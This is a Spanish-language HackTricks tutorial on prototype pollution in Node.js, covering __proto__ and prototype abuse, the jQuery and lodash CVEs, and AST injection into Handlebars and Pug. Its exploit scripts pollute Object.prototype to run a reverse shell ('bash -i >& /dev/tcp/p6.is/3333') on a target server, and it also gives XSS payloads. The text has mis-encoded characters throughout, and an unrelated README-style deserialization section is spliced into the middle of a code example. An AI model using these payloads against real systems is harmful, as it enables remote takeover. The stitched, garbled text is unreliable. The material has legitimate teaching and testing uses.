# NodeJS - \_\_proto\_\_ y la contaminaci√≥n del prototipo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Objetos en JavaScript <a href="#053a" id="053a"></a>

En primer lugar, necesitamos entender `Object` en JavaScript. Un objeto es simplemente una colecci√≥n de pares de clave y valor, a menudo llamados propiedades de ese objeto. Por ejemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

En JavaScript, `Object` es un objeto b√°sico, la plantilla para todos los objetos reci√©n creados. Es posible crear un objeto vac√≠o pasando `null` a `Object.create`. Sin embargo, el objeto reci√©n creado tambi√©n tendr√° un tipo que corresponde al par√°metro pasado y hereda todas las propiedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente aprendimos que un objeto en javascript es una colecci√≥n de claves y valores, por lo que tiene sentido que un objeto `null` sea simplemente un diccionario vac√≠o: `{}`.

## Funciones / Clases en Javascript <a href="#55dd" id="55dd"></a>

En Javascript, los conceptos de clase y funci√≥n est√°n bastante interrelacionados (la funci√≥n en s√≠ act√∫a como el constructor de la clase y la naturaleza real no tiene concepto de "clase" en javascript). Veamos el siguiente ejemplo:
```javascript
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```
![](<../../../.gitbook/assets/image (361).png>)

# Deserializaci√≥n de JavaScript en Node.js - Poluci√≥n de prototipos

## Descripci√≥n

La poluci√≥n de prototipos es una vulnerabilidad que afecta a los lenguajes de programaci√≥n basados en prototipos. En JavaScript, todos los objetos tienen un prototipo y los objetos heredan propiedades y m√©todos de su prototipo. La poluci√≥n de prototipos ocurre cuando se modifica el prototipo de un objeto para agregar propiedades maliciosas que pueden ser utilizadas para obtener acceso no autorizado a datos o funcionalidades.

En Node.js, la poluci√≥n de prototipos puede ocurrir cuando se deserializan objetos JSON utilizando la funci√≥n `JSON.parse()`. Si el objeto JSON contiene propiedades maliciosas que modifican el prototipo de un objeto, estas propiedades pueden ser utilizadas para llevar a cabo ataques de inyecci√≥n de c√≥digo o de denegaci√≥n de servicio.

## Prerrequisitos

- Node.js instalado en su sistema
- Conocimiento b√°sico de JavaScript y JSON

## Instalaci√≥n

1. Clonar el repositorio: `git clone https://github.com/dsopas/prototype-pollution-nodejs.git`
2. Instalar las dependencias: `npm install`

## Uso

1. Ejecutar el servidor: `npm start`
2. Enviar una solicitud POST a `http://localhost:3000/parse` con un objeto JSON en el cuerpo de la solicitud. El objeto JSON debe contener una propiedad `__proto__` que modifique el prototipo de un objeto. Por ejemplo:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

3. El servidor devolver√° el objeto JSON deserializado. Si el objeto JSON contiene una propiedad `isAdmin` que no deber√≠a estar presente, esto indica que la poluci√≥n de prototipos ha ocurrido con √©xito.

## Demostraci√≥n

[![asciicast](https://asciinema.org/a/336256.svg)](https://asciinema.org/a/336256)

## Mitigaci√≥n

Para mitigar la poluci√≥n de prototipos en Node.js, se recomienda utilizar una biblioteca de deserializaci√≥n segura, como `secure-json-parse` o `json-safe-parse`. Estas bibliotecas evitan la poluci√≥n de prototipos al analizar el objeto JSON y eliminar cualquier propiedad que modifique el prototipo de un objeto.

## Referencias

- [OWASP - Prototype Pollution](https://owasp.org/www-community/attacks/Prototype_Pollution)
- [Node.js Security Checklist - Prototype Pollution](https://blog.risingstack.com/node-js-security-checklist/#prototype-pollution)
```javascript
var person1 = new person("Satoshi", 70);
```
## Prototipos en JavaScript <a href="#3843" id="3843"></a>

Una cosa a tener en cuenta es que el atributo de prototipo puede ser cambiado/modificado/eliminado al ejecutar el c√≥digo. Por ejemplo, las funciones de la clase pueden ser a√±adidas din√°micamente:

![](<../../../.gitbook/assets/image (363).png>)

Las funciones de la clase tambi√©n pueden ser modificadas (como `toString` o `valueOf` en los siguientes casos):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Herencia

En un programa basado en prototipos, los objetos heredan propiedades/m√©todos de las clases. Las clases se derivan a√±adiendo propiedades/m√©todos a una instancia de otra clase o a√±adi√©ndolos a un objeto vac√≠o.

Tenga en cuenta que, si se a√±ade una propiedad a un objeto que se utiliza como prototipo para un conjunto de objetos (como el myPersonObj), los objetos para los que es el prototipo tambi√©n obtienen la nueva propiedad, pero esa propiedad no se imprime a menos que se llame espec√≠ficamente.

![](<../../../.gitbook/assets/image (366).png>)

## Poluci√≥n de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Ya deber√≠a haber aprendido que **cada objeto en JavaScript es simplemente una colecci√≥n de pares clave y valor** y que **cada objeto hereda del tipo Object en JavaScript**. Esto significa que si se puede contaminar el tipo Object, **¬°cada objeto JavaScript del entorno va a estar contaminado!**

Esto es bastante simple, s√≥lo se necesita ser capaz de modificar algunas propiedades (pares clave-valor) de un objeto JavaScript arbitrario, porque como cada objeto hereda de Object, cada objeto puede acceder al esquema de Object.
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
A partir del ejemplo anterior, es posible acceder a la estructura de un objeto utilizando las siguientes formas:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Como se mencion√≥ anteriormente, si ahora se agrega una propiedad al esquema del objeto, todos los objetos de JavaScript tendr√°n acceso a la nueva propiedad:
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Entonces, cada objeto JS contendr√° las nuevas propiedades: la funci√≥n `printHello` y la nueva constante `globalconstant`.

## Poluci√≥n de prototipos

Esta t√©cnica no es tan efectiva como la anterior, ya que no se puede contaminar el esquema del objeto JS. Pero en casos donde la **palabra clave `__proto__` est√° prohibida, esta t√©cnica puede ser √∫til**.

Si puede modificar las propiedades de una funci√≥n, puede modificar la propiedad `prototype` de la funci√≥n y **cada nueva propiedad que agregue aqu√≠ ser√° heredada por cada objeto creado a partir de esa funci√≥n:**
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
En este caso solo los **objetos creados a partir de la clase `person`** se ver√°n afectados, pero cada uno de ellos heredar√° las propiedades `sayHello` y `newConstant`.

Hay 2 formas de abusar de la contaminaci√≥n del prototipo para envenenar CADA objeto JS.

La primera ser√≠a contaminar el prototipo de propiedad de **Object** (como se mencion√≥ anteriormente, cada objeto JS hereda de este):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Si logras hacer eso, cada objeto JS podr√° ejecutar la funci√≥n `sayBye`.

La otra forma es envenenar el prototipo de un constructor de una variable de diccionario como en el siguiente ejemplo:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Despu√©s de ejecutar ese c√≥digo, **cada objeto JS podr√° ejecutar la funci√≥n `sayHey`**.

## Contaminando otros objetos

### Desde una clase a Object.prototype

En un escenario donde puedes **contaminar un objeto espec√≠fico** y necesitas **llegar a `Object.prototype`**, puedes buscarlo con algo como el siguiente c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
  for(let key2 in document.querySelector('a')[key1]) {
    if (document.querySelector('a')[key1][key2] === window) {
      console.log(key1 + "." + key2)
    }
  }
}
```
### Contaminaci√≥n de elementos de un array

Tenga en cuenta que, al igual que puede contaminar atributos de objetos en JS, si tiene acceso para contaminar un array, tambi√©n puede **contaminar los valores del array** accesibles **por √≠ndices** (tenga en cuenta que no puede sobrescribir valores, por lo que debe contaminar √≠ndices que se usan de alguna manera pero no se escriben).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Contaminaci√≥n de elementos HTML

Al generar un elemento HTML a trav√©s de JS, es posible **sobrescribir** el atributo **`innerHTML`** para hacer que escriba **c√≥digo HTML arbitrario**. [Idea y ejemplo de este art√≠culo](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Ejemplos

### Ejemplo B√°sico

¬øD√≥nde est√° la contaminaci√≥n del prototipo? Ocurre cuando hay un error en la aplicaci√≥n que permite sobrescribir propiedades de `Object.prototype`. Dado que cada objeto t√≠pico hereda sus propiedades de `Object.prototype`, podemos cambiar el comportamiento de la aplicaci√≥n. El ejemplo m√°s com√∫nmente mostrado es el siguiente:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imagina que tenemos una contaminaci√≥n de prototipos que hace posible establecer `Object.prototype.isAdmin = true`. Entonces, a menos que la aplicaci√≥n asigne expl√≠citamente alg√∫n valor, ¬°`user.isAdmin` siempre es verdadero!

Por ejemplo, `obj[a][b] = value`. Si el atacante puede controlar el valor de `a` y `value`, entonces solo necesita ajustar el valor de `a` a `__proto__` (en javascript, `obj["__proto__"]` y `obj.__proto__` son completamente equivalentes) entonces la propiedad `b` de todos los objetos existentes en la aplicaci√≥n se asignar√° a `value`.

Sin embargo, el ataque no es tan simple como el anterior, seg√∫n [el documento](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), solo podemos atacar cuando se cumple una de las siguientes tres condiciones:

* Realizar una fusi√≥n recursiva
* Definici√≥n de propiedad por ruta
* Clonar objeto

### Anulaci√≥n de funci√≥n
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution a RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Proto Pollution del lado del cliente a XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de Proto Pollution a trav√©s de jQuery $ .extend

$ .extend, si se maneja incorrectamente, puede cambiar las propiedades del objeto `prototype` (la plantilla de los objetos en la aplicaci√≥n). Esta propiedad luego aparecer√° en todos los objetos. Tenga en cuenta que solo la versi√≥n "profunda" (es decir, g) de $ .extened se ve afectada.

Los programadores a menudo usan esta funci√≥n para duplicar un objeto o completar nuevas propiedades a partir de un objeto predeterminado. Por ejemplo:

Podemos imaginar que `myObject` es un campo de entrada del usuario y se serializa en la base de datos.

En este c√≥digo, a menudo pensamos que, al ejecutarlo, se asignar√° el atributo `isAdmin` al objeto reci√©n creado. Pero esencialmente, se asigna directamente a `{}` y luego `{}.isAdmin` ser√° `true`. Si despu√©s de este c√≥digo, realizamos la siguiente verificaci√≥n:
```javascript
If (user.isAdmin === true) {
    // do something for admin
}
```
Si el usuario a√∫n no existe (`undefined`), se buscar√° la propiedad `isAdmin` en su objeto padre, que es el objeto al que se le agreg√≥ `isAdmin` con el valor `true` anteriormente.

Otro ejemplo cuando se ejecuta en JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Estos errores pueden afectar a muchos proyectos de Javascript, especialmente a los proyectos de NodeJS, el ejemplo m√°s pr√°ctico es el error en Mongoose, la biblioteca JS que ayuda a manipular MongoDB, en diciembre de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de poluci√≥n de prototipos a trav√©s de lodash

[Lodash](https://www.npmjs.com/package/lodash) es tambi√©n una biblioteca bien conocida que proporciona muchas funciones diferentes, ayud√°ndonos a escribir c√≥digo de manera m√°s conveniente y ordenada con m√°s de 19 millones de descargas semanales. Y tuvo el mismo problema que JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este error afecta a todas las versiones de Lodash, ya corregido en la versi√≥n 4.17.11.

### Otro tutorial con CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## Poluci√≥n de prototipos AST

En NodeJS, AST se utiliza en JS con mucha frecuencia, como motores de plantillas y typescript, etc.\
Para el motor de plantillas, la estructura es como se muestra arriba.

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

Informaci√≥n tomada de [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Puede insertar cualquier cadena en `Object.prototype.pendingContent` para determinar la posibilidad de un ataque.\
Esto le permite estar seguro de que los servidores est√°n utilizando el motor de Handlebars cuando existe una poluci√≥n de prototipos en un entorno de caja negra.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...
```
Esto se realiza mediante la funci√≥n `appendContent` de `javascript-compiler.js`. `appendContent` es as√≠. Si `pendingContent` est√° presente, se agrega al contenido y se devuelve.

`pushSource` hace que `pendingContent` sea `undefined`, evitando que la cadena se inserte varias veces.

**Explotaci√≥n**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebars funciona como se muestra en el gr√°fico anterior.

Despu√©s de que el lexer y el parser generan AST, se pasa a `compiler.js`. Podemos ejecutar la funci√≥n de plantilla que el compilador gener√≥ con algunos argumentos. Y devuelve la cadena como "Hello posix" (cuando msg es posix).
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
    this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
    break;
```
El analizador en handlebars fuerza el valor de un nodo cuyo tipo es NumberLiteral a ser siempre un n√∫mero a trav√©s del constructor Number. Sin embargo, puedes insertar una cadena no num√©rica aqu√≠ usando la contaminaci√≥n de prototipos.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}
```
Primero, observa la funci√≥n de compilaci√≥n, la cual admite dos formas de entrada, un objeto AST y una cadena de plantilla.

Cuando el tipo de entrada es `Program`, aunque el valor de entrada es una cadena, el analizador lo considera como si ya hubiera sido analizado por parser.js y lo env√≠a al compilador sin ning√∫n procesamiento adicional.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
```
El compilador toma el objeto AST (en realidad una cadena) y lo env√≠a al m√©todo `accept`.\
`accept` llama a `this[node.type]` del compilador.\
Luego toma el atributo `body` del AST y lo utiliza para construir una funci√≥n.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
            return parent[propertyName];
        }
        return undefined
    };

    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
        "name": "undefined",
        "hash": {},
        "data": data,
        "loc": {
            "start": 0,
            "end": 0
        }
    })) != null ? stack1 : "");
}
*/
```
Como resultado, un ataque puede ser configurado de la siguiente manera. Si se ha pasado por el analizador, se especifica una cadena que no puede ser asignada al valor de NumberLiteral. Pero si se procesa el AST inyectado, podemos insertar cualquier c√≥digo en la funci√≥n.

**Ejemplo**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)
```
### Pug

M√°s informaci√≥n en [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```
## ¬øQu√© puedo hacer para prevenir?

* Congelar propiedades con Object.freeze (Object.prototype)
* Realizar validaci√≥n en las entradas JSON de acuerdo con el esquema de la aplicaci√≥n
* Evitar el uso de funciones de combinaci√≥n recursiva de manera insegura
* Usar objetos sin propiedades de prototipo, como `Object.create(null)`, para evitar afectar la cadena de prototipos
* Usar `Map` en lugar de `Object`
* Actualizar regularmente nuevos parches para las bibliotecas

## Referencia

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
